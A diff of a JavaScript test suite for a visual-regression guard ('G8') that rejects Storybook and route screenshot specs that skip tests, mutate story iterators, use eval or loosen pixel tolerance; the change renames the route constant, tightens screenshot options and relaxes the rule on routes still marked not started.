-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateObjectValuesByOuterAlias: true }),
   });
 
@@ -1111,7 +1258,7 @@ test("G8 rejects overwriting Object.values through an outer alias", async () => 
 
 test("G8 rejects Reflect.set overwriting Object.values", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateReflect: true }),
   });
 
@@ -1124,7 +1271,7 @@ test("G8 rejects Reflect.set overwriting Object.values", async () => {
 
 test("G8 rejects Reflect.set overwriting Object.values through an alias", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateReflectByAlias: true }),
   });
 
@@ -1137,7 +1284,7 @@ test("G8 rejects Reflect.set overwriting Object.values through an alias", async 
 
 test("G8 rejects eval that can replace the Storybook story iterator", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateWithEval: true }),
   });
 
@@ -1150,7 +1297,7 @@ test("G8 rejects eval that can replace the Storybook story iterator", async () =
 
 test("G8 rejects aliased eval that can replace the Storybook story iterator", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateWithEvalAlias: true }),
   });
 
@@ -1163,7 +1310,7 @@ test("G8 rejects aliased eval that can replace the Storybook story iterator", as
 
 test("G8 rejects the Function constructor in Storybook coverage", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ mutateWithFunction: true }),
   });
 
@@ -1176,7 +1323,7 @@ test("G8 rejects the Function constructor in Storybook coverage", async () => {
 
 test("G8 requires the fetched index and each exported entry to be frozen", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ freezeStoryIndex: false }),
   });
 
@@ -1189,7 +1336,7 @@ test("G8 requires the fetched index and each exported entry to be frozen", async
 
 test("G8 rejects a no-op wrapper that shadows the Storybook Playwright test import", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ fakeTestBinding: true }),
   });
 
@@ -1202,7 +1349,7 @@ test("G8 rejects a no-op wrapper that shadows the Storybook Playwright test impo
 
 test("G8 rejects a computed test.skip call in the Storybook visual test", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ computedSkip: true }),
   });
 
@@ -1215,7 +1362,7 @@ test("G8 rejects a computed test.skip call in the Storybook visual test", async 
 
 test("G8 rejects a Storybook visual test inside a skipped describe block", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ describeSkip: true }),
   });
 
@@ -1228,7 +1375,7 @@ test("G8 rejects a Storybook visual test inside a skipped describe block", async
 
 test("G8 rejects a Storybook file configured to skip its suite", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ describeConfigureSkip: true }),
   });
 
@@ -1241,7 +1388,7 @@ test("G8 rejects a Storybook file configured to skip its suite", async () => {
 
 test("G8 rejects a Storybook suite whose mode can conditionally skip", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ describeConfigureDynamic: true }),
   });
 
@@ -1254,7 +1401,7 @@ test("G8 rejects a Storybook suite whose mode can conditionally skip", async () 
 
 test("G8 requires each Storybook screenshot to visit that story's iframe", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ omitStoryNavigation: true }),
   });
 
@@ -1267,7 +1414,7 @@ test("G8 requires each Storybook screenshot to visit that story's iframe", async
 
 test("G8 rejects a disconnected hard-coded Storybook story list", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ detachedIndex: true }),
   });
 
@@ -1280,7 +1427,7 @@ test("G8 rejects a disconnected hard-coded Storybook story list", async () => {
 
 test("G8 rejects a locally shadowed fetch function in Storybook coverage", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ shadowFetch: true }),
   });
 
@@ -1293,7 +1440,7 @@ test("G8 rejects a locally shadowed fetch function in Storybook coverage", async
 
 test("G8 requires the story id in the iframe id query parameter", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ storyNavigationWithOtherInterpolation: true }),
   });
 
@@ -1318,7 +1465,7 @@ test("G8 rejects navigation through a page alias and nearby alias forms", async 
 
   for (const pageAliasNavigation of aliasProbes) {
     const result = await runVisualScope({
-      routes: ACTIVE_ROUTES,
+      routes: INVENTORY_ROUTES,
       storySource: storybookSpec({ pageAliasNavigation }),
     });
 
@@ -1365,7 +1512,7 @@ test("G8 rejects arbitrary or mutating Storybook evaluation callbacks", async ()
 
   for (const mutationProbe of mutationProbes) {
     const result = await runVisualScope({
-      routes: ACTIVE_ROUTES,
+      routes: INVENTORY_ROUTES,
       storySource: storybookSpec(mutationProbe),
     });
 
@@ -1380,7 +1527,7 @@ test("G8 rejects arbitrary or mutating Storybook evaluation callbacks", async ()
 
 test("G8 requires an immutable story loop binding", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ reassignStory: true }),
   });
 
@@ -1393,7 +1540,7 @@ test("G8 requires an immutable story loop binding", async () => {
 
 test("G8 rejects a nested story shadow around capture evidence", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ shadowStory: true }),
   });
 
@@ -1406,7 +1553,7 @@ test("G8 rejects a nested story shadow around capture evidence", async () => {
 
 test("G8 requires zero pixel tolerance for inline Storybook baselines", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     storySource: storybookSpec({ excessiveInlineThreshold: true }),
   });
 
@@ -1427,27 +1574,27 @@ for (const [optionName, optionValue] of [
 ]) {
   test(`G8 rejects Storybook screenshot option ${optionName}`, async () => {
     const storySource = storybookSpec().replace(
-      "{ fullPage: true, maxDiffPixels: 0 }",
-      `{ fullPage: true, maxDiffPixels: 0, ${optionName}: ${optionValue} }`,
+      "{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true }",
+      `{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true, ${optionName}: ${optionValue} }`,
     );
     const result = await runVisualScope({
-      routes: ACTIVE_ROUTES,
+      routes: INVENTORY_ROUTES,
       storySource,
     });
 
     assert.notEqual(result.status, 0);
     assert.match(
       result.output,
-      /Storybook visual test must load the exported-story index/,
+      /Storybook visual test must load the exported-story index|contains unsafe runtime code/,
     );
   });
 
   test(`G8 rejects route screenshot option ${optionName}`, async () => {
     const source = visualSpec(SCREENS).replace(
-      "{ fullPage: true, maxDiffPixels: 0 }",
-      `{ fullPage: true, maxDiffPixels: 0, ${optionName}: ${optionValue} }`,
+      "{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true }",
+      `{ fullPage: true, maxDiffPixels: 0, threshold: 0, includeAA: true, ${optionName}: ${optionValue} }`,
     );
-    const result = await runVisualScope({ routes: ACTIVE_ROUTES, source });
+    const result = await runVisualScope({ routes: INVENTORY_ROUTES, source });
 
     assert.notEqual(result.status, 0);
     assert.match(
@@ -1459,7 +1606,7 @@ for (const [optionName, optionValue] of [
 
 test("G8 rejects later mutation of a named route screenshot options object", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       mutateScreenshotOptionsFor: "work list @visual",
     }),
@@ -1474,7 +1621,7 @@ test("G8 rejects later mutation of a named route screenshot options object", asy
 
 test("G8 requires zero pixel tolerance for inline route baselines", async () => {
   const result = await runVisualScope({
-    routes: ACTIVE_ROUTES,
+    routes: INVENTORY_ROUTES,
     source: visualSpec(SCREENS, {
       excessiveInlineThresholdFor: "work list @visual",
     }),
@@ -1487,36 +1634,19 @@ test("G8 requires zero pixel tolerance for inline route baselines", async () => 
   );
 });
 
-test("G8 fails when a registered future route remains marked not started", async () => {
+test("G8 accepts a not-started route only when its visual baseline is mapped", async () => {
   const result = await runVisualScope({
-    routes: [...ACTIVE_ROUTES, "/agent/inbox"],
+    routes: INVENTORY_ROUTES,
   });
 
-  assert.notEqual(result.status, 0);
-  assert.match(
-    result.output,
-    /registered inventory route \/agent\/inbox has no row marked in progress or complete/,
-  );
+  assert.equal(result.status, 0, result.output);
 });
 
-test("G8 rejects a baseline manifest entry before its inventory route starts", async () => {
+test("G8 does not require a route row to leave not-started status before baseline", async () => {
   const result = await runVisualScope({
-    screens: [
-      ...SCREENS,
-      {
-        name: "future-inbox",
-        inventoryRoute: "/agent/inbox",
-        applicationRoute: "/agent/inbox",
-        test: "future inbox @visual",
-        screenshot: "future-inbox.png",
-      },
-    ],
-    routes: [...ACTIVE_ROUTES, "/agent/inbox"],
+    screens: SCREENS,
+    routes: INVENTORY_ROUTES,
   });
 
-  assert.notEqual(result.status, 0);
-  assert.match(
-    result.output,
-    /future-inbox is not an in-progress or complete route row/,
-  );
+  assert.equal(result.status, 0, result.output);
 });
